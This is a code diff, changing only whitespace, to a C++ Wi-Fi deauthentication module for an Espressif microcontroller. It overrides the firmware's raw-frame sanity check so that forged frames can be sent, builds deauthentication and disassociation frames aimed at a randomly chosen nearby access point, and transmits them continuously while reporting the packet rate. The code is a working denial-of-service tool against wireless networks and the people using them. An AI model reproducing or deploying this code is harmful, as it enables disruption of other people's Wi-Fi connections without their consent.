@@ -13,8 +13,8 @@
 */
 
 // for some dumb reason espressif really doesn't like us sending deauth frames, so i'll need to make this fix
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
-  return 0;
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0;
 }
 
 // default values before we start
@@ -24,9 +24,9 @@ String Deauth::randomAP = "";
 int Deauth::randomIndex;
 
 /** developer note:
- * 
+ *
  * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
- * 
+ *
 */
 
 uint8_t Deauth::deauthTemp[26] = {
@@ -79,7 +79,7 @@ bool Deauth::send(uint8_t* buf, uint16_t len, bool sys_seq) {
 // source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 bool Deauth::broadcast(uint8_t* mac) {
     for (uint8_t i = 0; i < 6; i++) {
-         if (mac[i] != broadcastAddr[i]) return false;
+        if (mac[i] != broadcastAddr[i]) return false;
     }
 
     return true;
@@ -179,12 +179,12 @@ void Deauth::select() {
     Display::cleanDisplayFace("('-')");
     Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
     delay(250);
-        
+
     /** developer note:
-     * 
-     * here we will create the deauth frame using the header, 
+     *
+     * here we will create the deauth frame using the header,
      * as we find the AP in question we also generate the required information for it as well...
-     * 
+     *
     */
 
     // clear out exisitng frame...
@@ -213,11 +213,11 @@ void Deauth::select() {
     esp_wifi_get_mac(WIFI_IF_STA, mac);
 
     /** developer note:
-     * 
+     *
      * addr1: reciever addr
      * addr2: sender addr
      * addr3: filtering addr
-     * 
+     *
     */
 
     // copy our mac(s) to header
@@ -243,7 +243,7 @@ void Deauth::select() {
         std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 10);
         std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 16);
 
-        // build disassocaition 
+        // build disassocaition
         Deauth::disassociateFrame[0] = 0xA0; // type
         Deauth::disassociateFrame[1] = 0x00; // subtype
         Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
@@ -257,12 +257,12 @@ void Deauth::select() {
     Serial.print("('-') Full AP SSID: ");
     Serial.println(WiFi.SSID(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));  
+    Display::attachSmallText("Full AP SSID: " + (String) WiFi.SSID(Deauth::randomIndex));
 
     Serial.print("('-') AP Encryption: ");
     Serial.println(WiFi.encryptionType(Deauth::randomIndex));
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));  
+    Display::attachSmallText("AP Encryption: " + (String) WiFi.encryptionType(Deauth::randomIndex));
 
     Serial.print("('-') AP RSSI: ");
     Serial.println(WiFi.RSSI(Deauth::randomIndex));
@@ -272,7 +272,7 @@ void Deauth::select() {
     Serial.print("('-') AP BSSID: ");
     printMac(apBssid);
     Display::cleanDisplayFace("('-')");
-    Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));    
+    Display::attachSmallText("AP BSSID: " + (String) Deauth::printMacStr(apBssid));
 
     Serial.print("('-') AP Channel: ");
     Serial.println(WiFi.channel(Deauth::randomIndex));
@@ -289,7 +289,7 @@ void Deauth::select() {
 
 void Deauth::deauth() {
     if (Config::deauth) {
-       // select AP
+        // select AP
         Deauth::select();
 
         if (randomAP.length() > 0) {
@@ -357,8 +357,8 @@ void Deauth::start() {
                 Serial.print(" pkt/s");
                 Serial.println(" (AP:" + (String) randomAP.c_str() + ")");
                 Display::cleanDisplayFace("(>-<)");
-                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s" + " (AP:" + (String) randomAP.c_str() + ")"); 
-            } 
+                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s" + " (AP:" + (String) randomAP.c_str() + ")");
+            }
         } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) || !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             Serial.println("(X-X) Both packets failed to send!");
             Display::cleanDisplayFace("(X-X)");
